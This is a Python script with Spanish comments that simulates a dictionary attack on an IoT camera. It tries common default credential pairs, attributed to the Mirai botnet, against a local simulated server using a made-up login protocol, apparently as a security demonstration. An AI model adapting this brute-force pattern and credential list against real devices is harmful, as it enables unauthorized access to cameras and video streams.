import socket
import time
import sys

class CameraAttacker:
    def __init__(self, target_ip='127.0.0.1', target_port=8080):
        self.target_ip = target_ip
        self.target_port = target_port
        # Diccionario de credenciales por defecto comunes en cámaras IoT (Mirai botnet usa estas)
        self.common_creds = [
            ("root", "root"),
            ("admin", "admin"),
            ("user", "user"),
            ("admin", "12345"),
            ("admin", "password"),
            ("service", "service"),
            ("guest", "guest")
        ]

    def connect_and_try(self, user, password):
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.settimeout(2) # Timeout rápido
            client.connect((self.target_ip, self.target_port))
            
            # Simular petición HTTP con payload de login custom para nuestra simulación
            payload = f"LOGIN {user}:{password}"
            client.send(payload.encode('utf-8'))
            
            response = client.recv(4096).decode('utf-8')
            client.close()
            
            if "200 OK" in response:
                return True
            return False
            
        except ConnectionRefusedError:
            print("   [!] Error: No se puede conectar a la cámara (¿Está encendida?)")
            sys.exit()
        except Exception as e:
            return False

    def run_brute_force(self):
        print("\n" + "="*60)
        print("SIMULACIÓN DE ATAQUE IOT (DICCIONARIO DE CREDENCIALES)")
        print("="*60)
        print(f"Objetivo: {self.target_ip}:{self.target_port}")
        print(f"Cargando {len(self.common_creds)} combinaciones comunes...\n")
        
        start_time = time.time()
        
        for user, password in self.common_creds:
            print(f"[*] Probando: {user}:{password} ...", end='\r')
            time.sleep(0.3) # Simular latencia de red real
            
            if self.connect_and_try(user, password):
                print(f"[*] Probando: {user}:{password} -> ¡ÉXITO!             ")
                print("\n" + "!"*60)
                print(f" [PWNED] ACCESO CONCEDIDO")
                print(f" Credenciales encontradas: {user} / {password}")
                print(f" Tiempo de ataque: {time.time() - start_time:.2f} segundos")
                print("!"*60)
                
                print("\n[+] El atacante ahora puede ver el stream de video.")
                print("[+] El atacante puede inyectar bucles de video.")
                return
            
            print(f"[*] Probando: {user}:{password} -> Falló             ")

        print("\n[-] Ataque fallido. Credenciales no están en el diccionario básico.")

if __name__ == "__main__":
    attacker = CameraAttacker()
    attacker.run_brute_force()